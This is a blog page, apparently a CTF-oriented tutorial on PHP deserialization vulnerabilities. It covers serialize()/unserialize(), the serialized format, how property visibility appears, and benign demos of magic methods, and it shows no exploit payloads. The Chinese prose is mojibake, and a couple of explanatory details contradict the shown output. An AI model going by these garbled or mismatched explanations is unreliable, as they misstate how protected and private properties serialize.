

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="ååºåˆ—åŒ–æ¼æ´åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ç±»ä¸­ï¼Œå®ä¾‹åŒ–ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œè€ŒæŠŠè¿™ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæ“ä½œå°±æ˜¯åºåˆ—åŒ–ã€‚åè¿‡æ¥ï¼Œå°†å­—ç¬¦ä¸²è½¬åŒ–æˆç±»æ¨¡æ¿å½¢å¼çš„å¯¹è±¡ï¼Œå°±æ˜¯ååºåˆ—åŒ–ã€‚ä¸¤è€…ç»“åˆå°±å¯ä»¥æ–¹ä¾¿åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ®ã€‚ ä¸åŒç¼–ç¨‹è¯­è¨€åºåˆ—åŒ–åçš„å­˜å‚¨æ–‡ä»¶ä¸åŒï¼Œå½“ç„¶è¯­æ³•ä¹Ÿä¸ç›¸åŒ æˆ‘ä»¬ä»¥ php è¯­è¨€ä¸ºä¾‹     å‡½æ•° æè¿°    serialize() å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸²å­—ç¬¦ä¸²   unserialize() å°†ä¸€ä¸²å­—ç¬¦ä¸²è½¬æ¢æˆ">
<meta property="og:type" content="article">
<meta property="og:title" content="ååºåˆ—åŒ–æ¼æ´">
<meta property="og:url" content="http://example.com/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="ğŸ—„">
<meta property="og:description" content="ååºåˆ—åŒ–æ¼æ´åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ç±»ä¸­ï¼Œå®ä¾‹åŒ–ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œè€ŒæŠŠè¿™ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæ“ä½œå°±æ˜¯åºåˆ—åŒ–ã€‚åè¿‡æ¥ï¼Œå°†å­—ç¬¦ä¸²è½¬åŒ–æˆç±»æ¨¡æ¿å½¢å¼çš„å¯¹è±¡ï¼Œå°±æ˜¯ååºåˆ—åŒ–ã€‚ä¸¤è€…ç»“åˆå°±å¯ä»¥æ–¹ä¾¿åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ®ã€‚ ä¸åŒç¼–ç¨‹è¯­è¨€åºåˆ—åŒ–åçš„å­˜å‚¨æ–‡ä»¶ä¸åŒï¼Œå½“ç„¶è¯­æ³•ä¹Ÿä¸ç›¸åŒ æˆ‘ä»¬ä»¥ php è¯­è¨€ä¸ºä¾‹     å‡½æ•° æè¿°    serialize() å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸²å­—ç¬¦ä¸²   unserialize() å°†ä¸€ä¸²å­—ç¬¦ä¸²è½¬æ¢æˆ">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210529193530927.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/20201112222505683.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612154244475.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/02/.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014308067.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703015954924.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020204896.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014910163.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020742097.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703021610114.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612155638097.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211009121949046.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/10/.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021221915549.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/12/.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715000429267.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715001047516.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135305824.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135505974.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210801184545865.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729113615040.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/1.jpeg">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-a854e4d73e1be186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-1a263bb5852f77a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-f850f6f9d027f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-a2c524ab1ddaff2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-f61c565686e8f90f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-4d37aa50d88c5bea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-8c514575ce533262.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-581792f19940680a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-5c491572afb463d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-3f7ca4a955141198.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2021-05-29T12:24:17.000Z">
<meta property="article:modified_time" content="2022-03-31T14:38:00.957Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210529193530927.png">
  
  <title>ååºåˆ—åŒ–æ¼æ´ - ğŸ—„</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->

  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ‘©â€ğŸ’»</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="ååºåˆ—åŒ–æ¼æ´">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-05-29 20:24" pubdate>
        May 29, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      51k å­—
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ååºåˆ—åŒ–æ¼æ´</h1>
            
            <div class="markdown-body">
              <h1 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p>ç±»ä¸­ï¼Œå®ä¾‹åŒ–ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œè€ŒæŠŠè¿™ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæ“ä½œå°±æ˜¯åºåˆ—åŒ–ã€‚åè¿‡æ¥ï¼Œå°†å­—ç¬¦ä¸²è½¬åŒ–æˆç±»æ¨¡æ¿å½¢å¼çš„å¯¹è±¡ï¼Œå°±æ˜¯ååºåˆ—åŒ–ã€‚ä¸¤è€…ç»“åˆå°±å¯ä»¥æ–¹ä¾¿åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ®ã€‚</p>
<p>ä¸åŒç¼–ç¨‹è¯­è¨€åºåˆ—åŒ–åçš„å­˜å‚¨æ–‡ä»¶ä¸åŒï¼Œå½“ç„¶è¯­æ³•ä¹Ÿä¸ç›¸åŒ</p>
<p>æˆ‘ä»¬ä»¥ php è¯­è¨€ä¸ºä¾‹</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210529193530927.png" srcset="/img/loading.gif" lazyload></p>
<table>
<thead>
<tr>
<th align="center">å‡½æ•°</th>
<th align="center">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center">serialize()</td>
<td align="center">å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸²å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">unserialize()</td>
<td align="center">å°†ä¸€ä¸²å­—ç¬¦ä¸²è½¬æ¢æˆä¸€ä¸ªå¯¹è±¡</td>
</tr>
</tbody></table>
<h2 id="PHP-åºåˆ—åŒ–çš„æ ¼å¼"><a href="#PHP-åºåˆ—åŒ–çš„æ ¼å¼" class="headerlink" title="PHP åºåˆ—åŒ–çš„æ ¼å¼"></a>PHP åºåˆ—åŒ–çš„æ ¼å¼</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs smali">a -<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>b - boolean<br>d -<span class="hljs-built_in"> double</span><br><span class="hljs-built_in"></span>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class//æœ€å¸¸ç”¨çš„å¤åˆç±»å‹<br>N - null<br>R - pointer reference<br>U - unicode string<br></code></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    public $a = <span class="hljs-string">&#x27;ThisA&#x27;</span>;<br>    protected $b = <span class="hljs-string">&#x27;ThisB&#x27;</span>;<br>    private $c = <span class="hljs-string">&#x27;ThisC&#x27;</span>;<br>    public <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;this is a test!&#x27;</span>;<br>    &#125;<br>&#125;<br>$test = <span class="hljs-keyword">new</span> Test();<br>var_dump(serialize($test));<br>echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(unserialize(serialize($test)))<br>?&gt;<br></code></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">string</span>(<span class="hljs-number">84</span>) <span class="hljs-string">&quot;O:4:&quot;</span>Test<span class="hljs-string">&quot;:3:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:5:&quot;</span>ThisA<span class="hljs-string">&quot;;s:4:&quot;</span>*b<span class="hljs-string">&quot;;s:5:&quot;</span>ThisB<span class="hljs-string">&quot;;s:7:&quot;</span>Testc<span class="hljs-string">&quot;;s:5:&quot;</span>ThisC<span class="hljs-string">&quot;;&#125;&quot;</span><br><br><span class="hljs-keyword">object</span>(Test)#<span class="hljs-number">2</span> (<span class="hljs-number">3</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisA&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-keyword">protected</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisB&quot;</span> [<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-keyword">private</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisC&quot;</span> &#125;<br></code></pre></td></tr></table></figure>

<h4 id="public-protected-private-åœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«"><a href="#public-protected-private-åœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«" class="headerlink" title="public/protected/private åœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«"></a>public/protected/private åœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«</h4><p>è¿™ä¸ªç±»çš„ä¸‰ä¸ªæˆå‘˜å˜é‡ç”±äºå˜é‡å‰çš„ä¿®é¥°ä¸åŒï¼Œåœ¨åºåˆ—åŒ–å‡ºæ¥åæ˜¾ç¤ºçš„ä¹Ÿä¸åŒã€‚</p>
<p><code>s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;</code> ï¼šä»¥ <code>;</code>åˆ†å¼€å˜é‡åå’Œå˜é‡å€¼ï¼Œå˜é‡åä¸º 1 ä¸ªå­—ç¬¦çš„ aï¼Œå˜é‡å€¼ä¸ºâ€ThisAâ€</p>
<p><code>s:4:&quot;*b&quot;;s:5:&quot;ThisA&quot;;</code>ï¼šå¤šäº† <code>*</code>ï¼Œç”¨ä»¥åŒºåˆ† protected ä¿®é¥°ç¬¦ï¼Œå¦å¤–å®é™…é¡µé¢ä¸­ä¼šå‡ºç°ä¹±ç ï¼Œå®é™…ä¸Š protected å±æ€§çš„è¡¨ç¤ºæ–¹å¼æ˜¯åœ¨å˜é‡åå‰åŠ ä¸ª<code>%00*%00</code></p>
<p><code>s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;</code>ï¼š åœ¨å˜é‡åå‰åŠ ä¸Šäº†<code>%00ç±»å%00</code></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­å¹¶æ²¡æœ‰åŒ…å«è¿™ä¸ª test æ–¹æ³•çš„ä¿¡æ¯;ååºåˆ—åŒ–åï¼Œç±»çš„æˆå‘˜å˜é‡è¢«è¿˜åŸäº†ï¼Œä½†æ˜¯ç±»æ–¹æ³•æ²¡æœ‰è¢«è¿˜åŸã€‚</p>
<p>å› ä¸º<strong>åºåˆ—åŒ–ä¸ä¿å­˜æ–¹æ³•</strong></p>
<blockquote>
<p>â‘ private å±æ€§åºåˆ—åŒ–çš„æ—¶å€™ä¼šåœ¨ä¸¤ä¾§åŠ å…¥ç©ºå­—èŠ‚ï¼Œprivate å±æ€§åºåˆ—åŒ–æ—¶ä¼šåœ¨å˜é‡å‰é¢åŠ ä¸ŠåŠ ä¸Šç±»å</p>
<p>â‘¡ åºåˆ—åŒ–ä¸ä¿å­˜æ–¹æ³•</p>
</blockquote>
<h2 id="å¸¸è§çš„é­”æœ¯æ–¹æ³•"><a href="#å¸¸è§çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="å¸¸è§çš„é­”æœ¯æ–¹æ³•"></a>å¸¸è§çš„é­”æœ¯æ–¹æ³•</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct()<span class="hljs-comment">//ç±»çš„æ„é€ å‡½æ•°</span><br><br>__destruct()<span class="hljs-comment">//ç±»çš„ææ„å‡½æ•°</span><br><br>__call()<span class="hljs-comment">//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span><br><br>__callStatic()<span class="hljs-comment">//ç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span><br><br>__get()<span class="hljs-comment">//è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span><br><br>__set()<span class="hljs-comment">//è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span><br><br>__isset()<span class="hljs-comment">//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</span><br><br>__unset()<span class="hljs-comment">//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚</span><br><br>__sleep()<span class="hljs-comment">//æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><br>__wakeup()<span class="hljs-comment">//æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><br>__toString()<span class="hljs-comment">//ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span><br><br>__invoke()<span class="hljs-comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span><br><br>__set_state()<span class="hljs-comment">//è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span><br><br>__clone()<span class="hljs-comment">//å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><br>__autoload()<span class="hljs-comment">//å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><br>__debugInfo()<span class="hljs-comment">//æ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span><br></code></pre></td></tr></table></figure>

<h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>åˆ›å»ºå¯¹è±¡æ—¶å°±ä¼šæ‰§è¡Œçš„æ„é€ å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct test&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;Damn&#x27;</span>, <span class="hljs-string">&#x27;zZ&#x27;</span>, <span class="hljs-string">&#x27;10086&#x27;</span>);<br><br><span class="hljs-comment">//è¾“å‡ºï¼š__construct test</span><br></code></pre></td></tr></table></figure>

<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct test&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User();<br><br><span class="hljs-comment">//è¾“å‡ºï¼š__destruct test</span><br></code></pre></td></tr></table></figure>

<h3 id="Tostring"><a href="#Tostring" class="headerlink" title="__Tostring"></a>__Tostring</h3><p>å½“ä¸€ä¸ªç±»å¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² å¦åˆ™äº§ç”Ÿ<strong>E_RECOVERABLE_ERROR</strong> çº§åˆ«çš„è‡´å‘½é”™è¯¯</p>
<p>æƒ…å½¢æœ‰</p>
<ul>
<li><p><input checked="" disabled="" type="checkbox">  echo ($obj)/print($obj)</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  å­—ç¬¦ä¸²è¿æ¥</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  å­—ç¬¦ä¸²==æ¯”è¾ƒï¼Œæ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  æ ¼å¼åŒ– SQL è¯­å¥ï¼Œç»‘å®šå‚æ•°</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  æ•°ç»„ä¸­æœ‰å­—ç¬¦ä¸²</p>
</li>
</ul>
